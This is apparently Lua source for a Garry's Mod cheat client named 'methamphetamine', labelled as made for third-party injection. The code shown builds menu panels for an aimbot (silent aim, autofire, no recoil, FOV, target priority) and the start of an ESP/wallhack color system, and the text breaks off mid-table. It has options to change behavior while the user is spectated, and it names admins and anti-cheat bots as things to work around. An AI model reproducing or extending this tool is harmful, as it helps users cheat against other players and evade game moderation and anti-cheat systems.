--[[
    ____        ______     _       __              
   / __ )__  __/ / / /_  _| |     / /___ _________ 
  / __  / / / / / / / / / / | /| / / __ `/ ___/ _ \
 / /_/ / /_/ / / / / /_/ /| |/ |/ / /_/ / /  /  __/
/_____/\__,_/_/_/_/\__, / |__/|__/\__,_/_/   \___/ 
                  /____/                           
Created for 3rd party injection
]]--
methamphetamine = {}
methamphetamine.configs = {}
methamphetamine.mods = {}
methamphetamine.friends = {}
methamphetamine.entityesp = {}
methamphetamine.teams = {}

methamphetamine["colors"] = {
    ["border"] = Color(80, 80, 80),
    ["text"] = Color(179, 179, 179),
    ["disabledtext"] = Color(179, 179, 179),
    ["menubar"] = Color(30, 30, 30),
    ["background"] = Color(28, 28, 28),
    ["backgroundopaque"] = Color(25, 25, 25, 170),
    ["hovered"] = Color(90, 90, 90),
    ["divider"] = Color(97, 97, 97),
    ["activebutton"] = Color(103, 103, 103),
    ["buttonidle"] = Color(46, 46, 46),
    ["activetoggle"] = Color(90, 90, 90),
    ["grip"] = Color(90, 90, 90),
    ["gripbackground"] = Color(37, 37, 37),
    ["backgroundmascot"] = Color(255, 255, 255, 70)
}

local LocalPlayer = LocalPlayer()

local PANEL = {}

color_transparent = color_transparent or Color(255,255,255,0)

function PANEL:Init()

    methamphetamine.mods["Aim"]["Key"] = 0
    methamphetamine.mods["Aim"]["enabled"] = false
    methamphetamine.mods["Aim"]["Silent"] = 1
    methamphetamine.mods["Aim"]["hook"] = function() end
    methamphetamine.mods["Aim"]["Rage"] = false
    methamphetamine.mods["Aim"]["Autofire"] = false
    methamphetamine.mods["Aim"]["Nospread"] = false
    methamphetamine.mods["Aim"]["NoRecoil"] = false
    methamphetamine.mods["Aim"]["TargetLock"] = false
    methamphetamine.mods["Aim"]["DisableOnKill"] = false
    methamphetamine.mods["Aim"]["AutoWall"] = false
    methamphetamine.mods["Aim"]["FOV"] = 0
    methamphetamine.mods["Aim"]["Priority"] = "Field of View" 
    methamphetamine.mods["Aim"]["Jittering"] = 0
    methamphetamine.mods["Aim"]["Smooth"] = 0
    methamphetamine.mods["Aim"]["RecoilControl"] = 0
    methamphetamine.mods["Aim"]["Limb"] = "Head"
    methamphetamine.mods["Aim"]["Teams"] = {}
    methamphetamine.mods["Aim"]["Ignore"] = {
        Friends = false,
        Noclipping = false,
        OppositeTeam = false,
        SameTeam = false,
        Transparent = false,
        Invisible = false,
        Party = false,
        SelectedTeams = false,
    }


    self.masterpanel = self:Add("Panel")
    self.masterpanel:Dock(TOP)
    self.masterpanel:SetTall(25)
    self.mastertoggle = self.masterpanel:Add("methamphetamine.checkbox")
    self.mastertoggle:SetPos(0,0)
    self.mastertoggle:SetSize(20,20)
    self.mastertoggle:MethToolTip("Enables the aimbot.")
    self.mastertoggle.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].enabled = state
    end
    self.mastertoggle:Configure("Aim","enabled")

    print( methamphetamine.mods["Aim"] )

    

    self.options = self:Add("methamphetamine.panel")
    self.options:Dock(LEFT)
    self.options:SetPos(0,7)
    self.options.lblpnl = self.options:Add("Panel")
    self.options.lblpnl:Dock(TOP)
    self.options.lblpnl:SetTall(23)
    self.options.lblpnl.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.border )
        surface.DrawRect(5,h-1,w-10,1)
    end
    self.options.label = self.options.lblpnl:Add("DLabel")
    self.options.label:Dock(BOTTOM)
    self.options.label:SetText( "Options" )
    self.options.label:SetFont( methamphetamine.default.font )
    self.options.label:SetTextColor( methamphetamine.colors.text )
    self.options.label:DockMargin(8,0,0,0)
    self.options.label:SizeToContents()
    local options = self.options
    options.Key = options:Add("Panel")
    options.Key:Dock(TOP)
    options.Key:SetTall(41)
    options.Key:DockMargin(8,5,60,0)
    
    options.Key.Label = options.Key:Add("DLabel")
    options.Key.Label:Dock(TOP)
    options.Key.Label:SetText("Key")
    options.Key.Label:SetTextColor( methamphetamine.colors.text )
    options.Key.Label:SetFont( methamphetamine.default.font )
    
    options.Key.Button = options.Key:Add("methamphetamine.binder")
    options.Key.Button:Dock(TOP)
    options.Key.Button:SetTall(20)
    options.Key.Button:MethToolTip("Enables the aimbot only when this key is pressed.")
    options.Key.Button:SetText("Always")
    options.Key.Button:SetValue( methamphetamine.mods["Aim"].Key )
    options.Key.Button.OnChange = function(pnl,new)
        print("Selected ", new , input.GetKeyName( new ) )
        methamphetamine.mods["Aim"]["Key"] = new
    end
    options.Key.Button:Configure("Aim","Key")


    options.Silent = options:Add("Panel")
    options.Silent:Dock(TOP)
    options.Silent:SetTall(42)
    options.Silent:DockMargin(8,0,60,0)
    --options.Silent.Paint = function(pnl,w,h) draw.RoundedBox(0,0,0,w,h,color_white) end

    options.Silent.Label = options.Silent:Add("DLabel")
    options.Silent.Label:Dock(TOP)
    options.Silent.Label:SetText("Silent")
    options.Silent.Label:SetTextColor( methamphetamine.colors.text )
    options.Silent.Label:SetFont( methamphetamine.default.font )

    options.Silent.Dropdown = options.Silent:Add("methamphetamine.dropdown")
    options.Silent.Dropdown:Dock(TOP)
    options.Silent.Dropdown:SetTall(20)
    options.Silent.Dropdown:AddChoice("Disabled", function() methamphetamine.mods["Aim"].Silent = 0  end)
    options.Silent.Dropdown:AddChoice("Client", function() methamphetamine.mods["Aim"].Silent = 1  end)
    options.Silent.Dropdown:AddChoice("Server", function() methamphetamine.mods["Aim"].Silent = 2  end)
    options.Silent.Dropdown:SetValue( methamphetamine.mods["Aim"].Silent or 0 )
    options.Silent.Dropdown:Configure("Aim","Silent")


    options.autofirepnl = options:Add("Panel")
    options.autofirepnl:Dock(TOP)
    options.autofirepnl:SetTall(21)
    --options.autofirepnl.Paint = function(pnl,w,h) draw.RoundedBox(0,0,0,w,h,color_white) end
    options.autofirepnl.autofire = options.autofirepnl:Add("methamphetamine.checkbox")
    options.autofirepnl.autofire:SetSize(20,20)
    options.autofirepnl.autofire:SetPos(8,0)
    options.autofirepnl.autofire:SetLabel("Autofire")
    options.autofirepnl.autofire:SetState( methamphetamine.mods["Aim"].Autofire )
    options.autofirepnl.autofire.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"]["Autofire"] = state
    end
    options.autofirepnl.autofire:Configure("Aim","Autofire")

    options.ignorepnl = options:Add("Panel")
    options.ignorepnl:Dock(TOP)
    options.ignorepnl:DockMargin(8,1,0,0)
    options.ignorepnl:SetTall(20)
    options.ignorepnl.ignore = options.ignorepnl:Add("methamphetamine.miscdrop")
    --options.ignorepnl.ignore:SetTall(20)
    options.ignorepnl.ignore:SetLabel("When Spectated")
    options.ignorepnl.ignore:Dock(LEFT)
    options.ignorepnl.ignore:AddOption("Toggle",{
        panel = "methamphetamine.checkbox",
        text = "Change on Spectation",
        tooltip = "Forces aimbot settings to the ones below while being spectated",
    })
    options.ignorepnl.ignore:AddOption("ToggleAimbot",{
        panel = "methamphetamine.checkbox",
        text = "Enabled",
        tooltip = "Enables the aimbot.",
    })
    options.ignorepnl.ignore:AddOption("Toggle3",{
        panel = "methamphetamine.slider",
        text = "Change on Spectation",
        tooltip = "Forces aimbot settings to the ones below while being spectated",
        max = 10
    })

    
    




    self.accuracy = self:Add("methamphetamine.panel")
    self.accuracy:Dock(LEFT)
    self.accuracy:SetPos(0,7)
    self.accuracy.lblpnl = self.accuracy:Add("Panel")
    self.accuracy.lblpnl:Dock(TOP)
    self.accuracy.lblpnl:SetTall(23)
    self.accuracy.lblpnl.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.border )
        surface.DrawRect(5,h-1,w-10,1)
    end
    self.accuracy.label = self.accuracy.lblpnl:Add("DLabel")
    self.accuracy.label:Dock(BOTTOM)
    self.accuracy.label:SetText( "Accuracy" )
    self.accuracy.label:SetFont( methamphetamine.default.font )
    self.accuracy.label:SetTextColor( methamphetamine.colors.text )
    self.accuracy.label:DockMargin(8,0,0,0)
    self.accuracy.label:SizeToContents() 
    local accuracy = self.accuracy

    accuracy.nos = accuracy:Add("Panel")
    accuracy.nos:Dock(TOP)
    accuracy.nos:SetTall(20)
    accuracy.nos:DockMargin(0,4,0,1)
    accuracy.nospread = accuracy.nos:Add("methamphetamine.checkbox")
    accuracy.nospread:SetLabel("No Spread")
    accuracy.nospread:MethToolTip("Just a placebo unfortunately")
    accuracy.nospread:SetState( methamphetamine.mods["Aim"].Nospread )
    accuracy.nospread:SetPos(8,0)
    accuracy.nospread:SetSize(20,20)
    accuracy.nospread.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].NoSpread = state
    end
    accuracy.nospread:Configure("Aim","NoSpread")


    accuracy.nor = accuracy:Add("Panel")
    accuracy.nor:Dock(TOP)
    accuracy.nor:SetTall(20)
    accuracy.nor:DockMargin(0,1,0,1)
    accuracy.norecoil = accuracy.nor:Add("methamphetamine.checkbox")
    accuracy.norecoil:SetLabel("No Recoil")
    accuracy.norecoil:MethToolTip("Shit barely works with cw\nI will need to make it more reliable later.")
    accuracy.norecoil:SetState( methamphetamine.mods["Aim"].Norecoil )
    accuracy.norecoil:SetPos(8,0)
    accuracy.norecoil:SetSize(20,20)
    accuracy.norecoil.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].NoRecoil = state
    end 
    accuracy.norecoil:Configure("Aim","NoRecoil")

    accuracy.recoilcontrol = accuracy:Add("Panel")
    accuracy.recoilcontrol:Dock(TOP)
    accuracy.recoilcontrol:SetTall(35)
    --accuracy.recoilcontrol:DockPadding(8,0,8,0)
    accuracy.recoilcontrol:DockMargin(8,1,8,1)
    accuracy.recoilcontrollbl = accuracy.recoilcontrol:Add("DLabel")
    accuracy.recoilcontrollbl:Dock(TOP)
    accuracy.recoilcontrollbl:SetText("Recoil Control")
    accuracy.recoilcontrollbl:SetTextColor(methamphetamine.colors.text)
    accuracy.recoilcontrollbl:SetFont(methamphetamine.default.font)
    accuracy.recoilcontrollbl:SizeToContents()
    accuracy.recoilcontrol = accuracy.recoilcontrol:Add("methamphetamine.slider")
    accuracy.recoilcontrol:SetMax(1.5)
    accuracy.recoilcontrol:SetRound(false)
    accuracy.recoilcontrol:Dock(TOP)
    accuracy.recoilcontrol:SetTall(20)
    accuracy.recoilcontrol:SetValue( methamphetamine.mods["Aim"].RecoilControl )
    accuracy.recoilcontrol.OnValueChanged = function(pnl,frac)
        methamphetamine.mods["Aim"].RecoilControl = frac*5
    end
    accuracy.recoilcontrol:Configure("Aim","RecoilControl")


    accuracy.smo = accuracy:Add("Panel")
    accuracy.smo:Dock(TOP)
    accuracy.smo:SetTall(35)
    --accuracy.smo:DockPadding(8,0,8,0)
    accuracy.smo:DockMargin(8,1,8,1)
    accuracy.smolbl = accuracy.smo:Add("DLabel")
    accuracy.smolbl:Dock(TOP)
    accuracy.smolbl:SetText("Smoothing")
    accuracy.smolbl:SetTextColor(methamphetamine.colors.text)
    accuracy.smolbl:SetFont(methamphetamine.default.font)
    accuracy.smolbl:SizeToContents()
    accuracy.smooth = accuracy.smo:Add("methamphetamine.slider")
    accuracy.smooth:SetMax(50)
    accuracy.smooth:Dock(TOP)
    accuracy.smooth:SetTall(20)
    accuracy.smooth:SetValue( methamphetamine.mods["Aim"].Smooth )
    accuracy.smooth.OnValueChanged = function(pnl,frac)
        methamphetamine.mods["Aim"].Smooth = frac*50
    end
    accuracy.smooth:Configure("Aim","Smooth")

    accuracy.jit = accuracy:Add("Panel")
    accuracy.jit:Dock(TOP)
    accuracy.jit:SetTall(35)
    --accuracy.jit:DockPadding(8,0,8,0)
    accuracy.jit:DockMargin(8,1,8,1)
    accuracy.jitlbl = accuracy.jit:Add("DLabel")
    accuracy.jitlbl:Dock(TOP)
    accuracy.jitlbl:SetText("Jittering")
    accuracy.jitlbl:SetTextColor(methamphetamine.colors.text)
    accuracy.jitlbl:SetFont(methamphetamine.default.font)
    accuracy.jitlbl:SizeToContents()
    accuracy.jittering = accuracy.jit:Add("methamphetamine.slider")
    accuracy.jittering:SetMax(10)
    accuracy.jittering:Dock(TOP)
    accuracy.jittering:SetValue(methamphetamine.mods["Aim"].Jittering)
    accuracy.jittering:SetTall(20)
    accuracy.jittering.OnValueChanged = function(pnl,frac)
        methamphetamine.mods["Aim"].Jittering = frac*50
    end
    accuracy.jittering:Configure("Aim","Jittering")

    accuracy.hitbox = accuracy:Add("Panel")
    accuracy.hitbox:Dock(TOP)
    accuracy.hitbox:SetTall(35)
    accuracy.hitbox:DockMargin(8,1,8,1)
    accuracy.hitboxlabel = accuracy.hitbox:Add("DLabel")
    accuracy.hitboxlabel:Dock(TOP)
    accuracy.hitboxlabel:SetText("Hitbox")
    accuracy.hitboxlabel:SetTextColor(methamphetamine.colors.text)
    accuracy.hitboxlabel:SetFont(methamphetamine.default.font)
    accuracy.hitboxlabel:SizeToContents()
    accuracy.hitbox = accuracy.hitbox:Add("methamphetamine.dropdown")
    accuracy.hitbox:AddChoice("Head", function() methamphetamine.mods["Aim"].Limb = "Head" end)
    accuracy.hitbox:AddChoice("Hitscan", function() methamphetamine.mods["Aim"].Limb = "Spine" end)
    accuracy.hitbox:AddChoice("Body", function() methamphetamine.mods["Aim"].Limb = "Spine" end)
    accuracy.hitbox:SetValue( methamphetamine.mods["Aim"].Limb )
    accuracy.hitbox:Dock(TOP)
    accuracy.hitbox:SetTall(20)
    accuracy.smooth:Configure("Aim","Smooth")
  

    self.target = self:Add("methamphetamine.panel")
    self.target:Dock(LEFT)
    self.target.lblpnl = self.target:Add("Panel")
    self.target.lblpnl:Dock(TOP)
    self.target.lblpnl:SetTall(23)
    self.target.lblpnl.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.border )
        surface.DrawRect(5,h-1,w-10,1)
    end
    self.target.label = self.target.lblpnl:Add("DLabel")
    self.target.label:Dock(BOTTOM)
    self.target.label:SetText( "Target" )
    self.target.label:SetFont( methamphetamine.default.font )
    self.target.label:SetTextColor( methamphetamine.colors.text )
    self.target.label:DockMargin(8,0,0,0)
    self.target.label:SizeToContents()
    local target = self.target


    target.fov = target:Add("Panel")
    target.fov:Dock(TOP)
    target.fov:SetTall(35)
    --target.fov:DockPadding(8,0,8,0)
    target.fov:DockMargin(8,4,8,1)
    target.fovlbl = target.fov:Add("DLabel")
    target.fovlbl:Dock(TOP)
    target.fovlbl:SetText("FoV")
    target.fovlbl:SetTextColor(methamphetamine.colors.text)
    target.fovlbl:SetFont(methamphetamine.default.font)
    target.fovlbl:SizeToContents()
    target.fov = target.fov:Add("methamphetamine.slider")
    target.fov:SetMax(180)
    target.fov:Dock(TOP)
    target.fov:SetTall(20)
    target.fov:SetValue( methamphetamine.mods["Aim"].FOV )
    target.fov.OnValueChanged = function(pnl,frac)
        methamphetamine.mods["Aim"].FOV = frac*180
    end
    target.fov:Configure("Aim","FOV")

    
    target.TLock = target:Add("Panel")
    target.TLock:Dock(TOP)
    target.TLock:SetTall(20)
    target.TLock:DockMargin(0,1,0,1)
    target.TargetLock = target.TLock:Add("methamphetamine.checkbox")
    target.TargetLock:SetLabel("Target Lock")
    target.TargetLock:MethToolTip("Makes the aimbot aim at one target unless dead or not visible.")
    target.TargetLock:SetPos(8,0)
    target.TargetLock:SetState( methamphetamine.mods["Aim"].TargetLock )
    target.TargetLock:SetSize(20,20)
    target.TargetLock.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].TargetLock = state
    end 
    target.TargetLock:Configure("Aim","TargetLock")

    target.priority = target:Add("Panel")
    target.priority:Dock(TOP)
    target.priority:SetTall(35)
    target.priority:DockMargin(8,1,8,1)
    target.prioritylabel = target.priority:Add("DLabel")
    target.prioritylabel:Dock(TOP)
    target.prioritylabel:SetText("Priority")
    target.prioritylabel:SetTextColor(methamphetamine.colors.text)
    target.prioritylabel:SetFont(methamphetamine.default.font)
    target.prioritylabel:SizeToContents()
    target.priority = target.priority:Add("methamphetamine.dropdown")
    target.priority:AddChoice("Closest Distance", function() methamphetamine.mods["Aim"].Priority = "Closest Distance" end)
    target.priority:AddChoice("Least Health", function() methamphetamine.mods["Aim"].Priority = "Least Health" end)
    target.priority:AddChoice("Most Health", function() methamphetamine.mods["Aim"].Priority = "Most Health" end)
    target.priority:AddChoice("Field of View", function() methamphetamine.mods["Aim"].Priority = "Field of View" end)
    target.priority:Dock(TOP)
    target.priority:SetTall(20)
    target.priority:SetValue( methamphetamine.mods["Aim"].Priority )
    target.priority:Configure("Aim","Priority")

    target.DOK = target:Add("Panel")
    target.DOK:Dock(TOP)
    target.DOK:SetTall(20)
    target.DOK:DockMargin(0,1,0,1)
    target.DOK = target.DOK:Add("methamphetamine.checkbox")
    target.DOK:SetLabel("Disable on Kill")
    target.DOK:MethToolTip("Makes the aimbot aim at one target unless dead or not visible.")
    target.DOK:SetPos(8,0)
    target.DOK:SetState( methamphetamine.mods["Aim"].DisableOnKill )
    target.DOK:SetSize(20,20)
    target.DOK.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].DisableOnKill = state
    end 
    target.DOK:Configure("Aim","DisableOnKill")

    target.AutoWall = target:Add("Panel")
    target.AutoWall:Dock(TOP)
    target.AutoWall:SetTall(20)
    target.AutoWall:DockMargin(0,1,0,1)
    target.AutoWall = target.AutoWall:Add("methamphetamine.checkbox")
    target.AutoWall:SetLabel("Auto Wall")
    target.AutoWall:MethToolTip("Makes the aimbot aim at one target unless dead or not visible.")
    target.AutoWall:SetPos(8,0)
    target.AutoWall:SetState( methamphetamine.mods["Aim"].AutoWall )
    target.AutoWall:SetSize(20,20)
    target.AutoWall.OnToggle = function(pnl,state)
        methamphetamine.mods["Aim"].AutoWall = state
    end 
    target.AutoWall:Configure("Aim","Autowall")

    target.ignore = target:Add("Panel")
    target.ignore:Dock(TOP)
    target.ignore:SetTall(20)
    target.ignore:DockMargin(0,1,0,1)
    target.ignore.ignore = target.ignore:Add("methamphetamine.miscdrop")
    target.ignore.ignore:SetPos(8,0)    
    target.ignore.ignore:SetLabel("Ignore")
    target.ignore.ignore:AddOption("Friends",{
        panel = "methamphetamine.checkbox",
        text = "Friends",
        tooltip = "Makes the Aimbot not target players who are marked as friends.",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["Friends"] = state
        end,
        Configure = {"Aim","Ignore","Friends"}
    })
    target.ignore.ignore:AddOption("Party Members",{
        panel = "methamphetamine.checkbox",
        text = "Party Members",
        tooltip = "Makes the Aimbot not target players who are in your party.",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["Party"] = state
        end,
        Configure = {"Aim","Ignore","Party"}
    })
    target.ignore.ignore:AddOption("Same Team",{
        panel = "methamphetamine.checkbox",
        text = "Same Team",
        tooltip = "Makes the Aimbot not target players who are the same team as you.",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["SameTeam"] = state
        end,
        Configure = {"Aim","Ignore","SameTeam"}

    })
    target.ignore.ignore:AddOption("Selected Teams",{
        panel = "methamphetamine.checkbox",
        text = "Selected Teams",
        tooltip = "Makes the Aimbot not target players on the teams you've selected on the Teams List.",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["SelectedTeams"] = state
        end,
        Configure = {"Aim","Ignore","SelectedTeams"}
    })
    target.ignore.ignore:AddOption("Opposite Teams",{
        panel = "methamphetamine.checkbox",
        text = "Opposite Teams",
        tooltip = "Makes the Aimbot not target players who are on any other team but yours..",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["OppositeTeam"] = state
        end,
        Configure = {"Aim","Ignore","OppositeTeam"}
    })
    target.ignore.ignore:AddOption("Noclipping",{
        panel = "methamphetamine.checkbox",
        text = "Noclipping",
        tooltip = "Makes the Aimbot not target players who are no-clipping.",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["Noclipping"] = state
        end,
        Configure = {"Aim","Ignore","Noclipping"}
    })
    target.ignore.ignore:AddOption("Transparent",{
        panel = "methamphetamine.checkbox",
        text = "Transparent",
        tooltip = "Makes the Aimbot not target players who are transparent (Typically spawn protected).",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["Transparent"] = state
        end,
        Configure = {"Aim","Ignore","Transparent"}
    })
    target.ignore.ignore:AddOption("Invisible",{
        panel = "methamphetamine.checkbox",
        text = "Invisible",
        tooltip = "Makes the Aimbot not target players who are invisible. (Typically admins or anti-cheat bots)",
        OnToggle = function(pnl,state)
            methamphetamine.mods["Aim"]["Ignore"]["Invisible"] = state
        end,
        Configure = {"Aim","Ignore","Invisible"}
    })

end

function PANEL:PerformLayout(w,h)
    self.options:SetWide( 192 )
    self.options:DockMargin(0,0,4,0)

    self.accuracy:SetWide( 215 )
    self.accuracy:DockMargin(0,0,0,0)

    self.target:SetWide( 205 )
    self.target:DockMargin(4,0,0,0)
end

PANEL.Paint = nil

vgui.Register("methamphetamine.aim.aimbot", PANEL )


local PANEL = {}
AccessorFunc(PANEL,"m_color","Color")
function PANEL:Init()
    self.box = self:Add("DColorMixer")
    self.box:SetSize( 230-16,215-16 )
    self.box:SetPos(8,8)
    self.box:SetPalette(false)
    self.box:SetAlphaBar(false)
    self.box:SetWangs( false )
    self.box.OnFocusChanged = function(pnl,gained)
        if gained then return end
        timer.Simple(0,function()
            local panel = vgui.GetKeyboardFocus()
            if panel.isTooltip or panel == pnl then return end
            pnl:Remove()
        end)
    end

    self.bigcircle = methamphetamine.circles.New( CIRCLE_OUTLINED,8 , 0,0 )
    self.box.HSV.Knob.Paint = function(pnl,w,h)
        if pnl:IsHovered() and input.IsMouseDown( MOUSE_LEFT ) then
            surface.DrawCircle( w/2 , h/2 , w/2 , 255,255,255,255 )
        else
            surface.DrawCircle( w/2 , h/2 , 4 , 255,255,255,255 )
        end
    end
    self.box.HSV.OnUserChanged = function(pnl,col)
        self:SetColor( col )
        if pnl.OnColourChanged then
            pnl:OnColourChanged( col )
        end
    end

    self.hex = self:Add("Panel")
    self.hex:Dock(BOTTOM)
    self.hex:SetTall(20)
    self.hex:DockMargin(8,1,8,8)
    self.hex.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.buttonidle )
        surface.DrawRect(0,0,w,h)
        local col = self:GetColor()
        draw.SimpleText( string.upper(string.format("#%x%x%x", col.r,col.g,col.b )) , methamphetamine.default.font , 4, h/2, methamphetamine.colors.text , 0 , 1 )
    end


    self.rgb = self:Add("Panel")
    self.rgb:Dock(BOTTOM)
    self.rgb:DockPadding(8,0,8,0)
    self.rgb:SetTall(20)

    local w = (230-16)/4


    self.rgb.r = self.rgb:Add("DPanel")
    self.rgb.r:Dock(LEFT)
    self.rgb.r:DockMargin(0,1,1,1)
    self.rgb.r:SetWide(w)  
    self.rgb.r.Paint = function(pnl,w,h)
        
        surface.SetDrawColor( methamphetamine.colors.buttonidle )
        surface.DrawRect(0,0,w,h)
        draw.SimpleText( string.format("R: %d", self:GetColor().r ), methamphetamine.default.font , 4,h/2,methamphetamine.colors.text,0,1 )
    end
    
    self.rgb.g = self.rgb:Add("DPanel")
    self.rgb.g:Dock(LEFT)
    self.rgb.g:DockMargin(0,1,1,1)
    self.rgb.g:SetWide(w)  
    self.rgb.g.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.buttonidle )
        surface.DrawRect(0,0,w,h)
        draw.SimpleText( string.format("G: %d", self:GetColor().g ), methamphetamine.default.font , 4,h/2,methamphetamine.colors.text,0,1 )
    end

    self.rgb.b = self.rgb:Add("DPanel")
    self.rgb.b:Dock(LEFT)
    self.rgb.b:DockMargin(0,1,1,1)
    self.rgb.b:SetWide(w)  
    self.rgb.b.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.buttonidle )
        surface.DrawRect(0,0,w,h)
        draw.SimpleText( string.format("B: %d", self:GetColor().b ), methamphetamine.default.font , 4,h/2,methamphetamine.colors.text,0,1 )
    end
    
    self.rgb.a = self.rgb:Add("DPanel")
    self.rgb.a:Dock(LEFT)
    self.rgb.a:DockMargin(0,1,0,1)
    self.rgb.a:SetWide(w-1) 
    self.rgb.a.Paint = function(pnl,w,h)
        surface.SetDrawColor( methamphetamine.colors.buttonidle )
        surface.DrawRect(0,0,w,h)
        draw.SimpleText( string.format("A: %d", self:GetColor().a ), methamphetamine.default.font , 4,h/2,methamphetamine.colors.text,0,1 )
    end 

end

vgui.Register("methamphetamine.colorbox",PANEL, "methamphetamine.panel")

local PANEL = {}
AccessorFunc(PANEL,"m_defaultCol","Color")
function PANEL:Init()
    if !self:GetColor() then self:SetColor( color_white ) end   
    self:SetText("")
end

function PANEL:Paint(w,h)
    local col = self:GetColor()
    surface.SetDrawColor(  col.r,col.g,col.b )
    surface.DrawRect(0,0,w,h)
end

function PANEL:OnCursorEntered()
    if IsValid( self.preivew ) then self.preview:Remove() end
    local col = color_white
    self.preview = vgui.Create("methamphetamine.panel")

    self.preview.isPreview = true
    local x,y = input.GetCursorPos()
    self.preview:SetPos( x + 20 , y )
    self.preview:SetSize(230,60)
    self.preview:MakePopup()
    self.preview.col = self.preview:Add("Panel")
    self.preview.col:SetPos(8,8)
    self.preview.col:SetSize(44,44)
    self.preview.col.Paint = function(pnl,w,h)
        local col = self:GetColor()
        surface.SetDrawColor( col.r, col.g, col.b, 255 ) 
        surface.DrawRect( 0,0,w,h )
    end
    self.preview.hex = self.preview:Add("DLabel")
    self.preview.hex:SetPos( 60 , 8 )
    self.preview.hex:SetFont( methamphetamine.default.font )
    self.preview.hex:SetTextColor( methamphetamine.colors.text )

    self.preview.rgb = self.preview:Add("DLabel")
    self.preview.rgb:SetPos( 60 , 22 )
    self.preview.rgb:SetFont( methamphetamine.default.font )
    self.preview.rgb:SetTextColor( methamphetamine.colors.text )

    self.preview.ratio = self.preview:Add("DLabel")
    self.preview.ratio:SetPos( 60 , 35 )
    self.preview.ratio:SetFont( methamphetamine.default.font )
    self.preview.ratio:SetTextColor( methamphetamine.colors.text )

end
function PANEL:OnCursorExited()
    if IsValid( self.preview ) then self.preview:Remove() return end
end
function PANEL:Think()
    if IsValid( self.preview ) then
        self.preview:MoveToFront()
        local col = self:GetColor()
        print( col )
        self.preview.hex:SetText( "#" .. string.upper(string.format("#%x%x%x", col.r, col.g, col.b )) )
        self.preview.rgb:SetText( string.format("R:%d, G:%d, B:%d, A:%d", col.r,col.g,col.b,col.a) )
        self.preview.ratio:SetText( string.format("(%.3f, %.3f, %.3f, %.3f)", col.r/255,col.g/255,col.b/255,col.a/255) )
        self.preview.ratio:SizeToContents()
        self.preview.rgb:SizeToContents()
        self.preview.hex:SizeToContents()

    end
end

function PANEL:OnCursorMoved()
    if not IsValid( self.preview ) then return end
    local x,y = input.GetCursorPos()
    self.preview:SetPos( x + 20 , y )
end
function PANEL:DoClick()
    if IsValid( self.menu ) then self.menu:SetVisible( not self.menu:IsVisible() ) self.menu:MakePopup() local x,y = input.GetCursorPos() self.menu:SetPos(x+1,y+1) return end
    if IsValid(self.preview) then self.preview:Remove() end
    local x,y = input.GetCursorPos()
    self.menu = vgui.Create("methamphetamine.colorbox")
    self.menu:SetSize( 230,260 )
    self.menu:SetPos( x+1, y+1 )
    self.menu:MakePopup()
    self.menu:SetColor( self:GetColor() )
    self.menu.box.HSV.OnUserChanged = function(pnl,col)
        self.menu:SetColor( col )
        self:SetColor( col )
        self:OnColourChanged( col )
    end
    self.menu.OnFocusChanged = function(pnl,gained)
        if gained then return end
        timer.Simple(0,function()
            local panel = vgui.GetKeyboardFocus()
            if not IsValid( panel ) then return end
            if panel.isTooltip or panel == pnl or panel.isPreview then return end
            pnl:SetVisible( false )
        end)
    end
end

function PANEL:OnColourChanged( colour )

end
vgui.Register("methamphetamine.colorselector", PANEL, "DButton" )

local PANEL = {}

function PANEL:Init()
    self.m_Text = ""
    self.toggle = self:Add("methamphetamine.checkbox")
    self.toggle:Dock(LEFT)
    self.toggle:DockMargin(2,0,2,0)
    self.toggle:SetWide( 20 )
    self.toggle:SetLabel("Box")

    self.activecol = self:Add("methamphetamine.colorselector")
    self.activecol:Dock(RIGHT)
    self.activecol:SetWide(20)
    self.activecol:DockMargin(1,1,1,1)
    self.activecol.OnColourChanged = function( panel, colour )
        self:OnColourChanged( colour )
    end

    self.espcol = self:Add("methamphetamine.dropdown")
    self.espcol:Dock(RIGHT)
    self.espcol:SetWide(101)
    self.espcol:DockMargin(0,0,0,0)
    self.espcol:HideDiamond(true)
    

    self.esptype = self:Add("methamphetamine.dropdown")
    self.esptype:Dock(RIGHT)
    self.esptype:SetWide(106)
    self.esptype:HideDiamond(true)
    self.esptype:DockMargin(2,0,2,0)
end

function PANEL:AddChoice( name , func )
    self.esptype:AddChoice( name , func )
end

function PANEL:SetText( txt )
    self.m_Text = txt
    self.toggle:SetLabel( txt )
end

function PANEL:GetText()
    return self.m_Text
end

function PANEL:HideColorDropdown( bHide )
    self.espcol:SetVisible( not bHide )
end
function PANEL:HideTypeDropdown( bHide )
    self.esptype:SetVisible( not bHide )
end

function PANEL:OnColourChanged( colour )

end
function PANEL:SetColor( col )

end
vgui.Register("methamphetamine.espoption", PANEL)

local espdata = {
    presets = {
        {
            {
                name = "2D [None]",
            },
            {
                name = "2D [Inner]",
            },
            {
                name = "2D [Outer]",
            },
            {
                name = "2D [Both]",
            },
            {
                name = "Cornered [None]",
            },
            {
                name = "Cornered [Inner]",
            },
            {
                name = "3D [None]",
            },
        },
        {
            {
                name = "Top",
            },
            {
                name = "Left",
            },
            {
                name = "Bottom",
            },
            {
                name = "Right",
            },
        },
        {
            {
                name = "Flat",
            },
            {
                name = "Texture",
            },
            {
                name = "Wallhack",
            },
            {
                name = "Wireframe",
            },
        },
        {
            {
                name = "Selected Color",
            },
            {
                name = "Rainbow",
            },
        },
        {
            {
                name = "Selected Color",
            },
            {
